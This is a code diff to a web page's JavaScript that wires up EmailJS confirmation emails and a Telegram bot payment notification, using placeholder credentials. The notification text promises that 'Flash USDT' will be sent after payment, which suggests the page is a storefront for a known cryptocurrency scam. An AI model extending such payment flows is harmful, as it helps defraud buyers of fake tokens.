@@ -744,8 +744,12 @@
     <script src="../user/js/main.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
 
-<script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
     <script>
+        // Initialize EmailJS
+        // Update with your actual EmailJS User ID
+        emailjs.init('YOUR_EMAILJS_USER_ID'); // Replace with your EmailJS User ID
         $(document).ready(function(){
             // Copy Btn Section start
                 var copyBtn = $('#copyBtn');
@@ -1014,8 +1018,16 @@
                 
                 // Using EmailJS for email sending
                 if (typeof emailjs !== 'undefined') {
-                    await emailjs.send('YOUR_SERVICE_ID', 'YOUR_TEMPLATE_ID', emailData);
-                    console.log('✅ Confirmation email sent successfully');
+                    // Update these with your actual EmailJS credentials
+                    const SERVICE_ID = 'YOUR_SERVICE_ID';      // Replace with your EmailJS Service ID
+                    const TEMPLATE_ID = 'YOUR_TEMPLATE_ID';    // Replace with your EmailJS Template ID
+                    
+                    if (SERVICE_ID !== 'YOUR_SERVICE_ID' && TEMPLATE_ID !== 'YOUR_TEMPLATE_ID') {
+                        await emailjs.send(SERVICE_ID, TEMPLATE_ID, emailData);
+                        console.log('✅ Confirmation email sent successfully');
+                    } else {
+                        console.log('⚠️ EmailJS credentials not configured. Please update SERVICE_ID and TEMPLATE_ID in the code.');
+                    }
                 } else {
                     console.log('📧 EmailJS not available, would send email:', emailData);
                 }
@@ -1040,8 +1052,9 @@
 ✅ Payment confirmed and Flash USDT will be sent within 15 minutes.`;
 
                 // Using Telegram Bot API
-                const botToken = 'YOUR_BOT_TOKEN'; // Replace with your bot token
-                const chatId = 'YOUR_CHAT_ID'; // Replace with your chat ID
+                // Update these with your actual Telegram credentials
+                const botToken = 'YOUR_BOT_TOKEN'; // Replace with your bot token from @BotFather
+                const chatId = 'YOUR_CHAT_ID';    // Replace with your chat ID
                 
                 if (botToken !== 'YOUR_BOT_TOKEN' && chatId !== 'YOUR_CHAT_ID') {
                     const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
@@ -1062,7 +1075,7 @@
                         console.error('❌ Failed to send Telegram notification');
                     }
                 } else {
-                    console.log('📱 Telegram bot not configured, would send:', telegramMessage);
+                    console.log('⚠️ Telegram credentials not configured. Please update botToken and chatId in the code.');
                 }
                 
             } catch (error) {
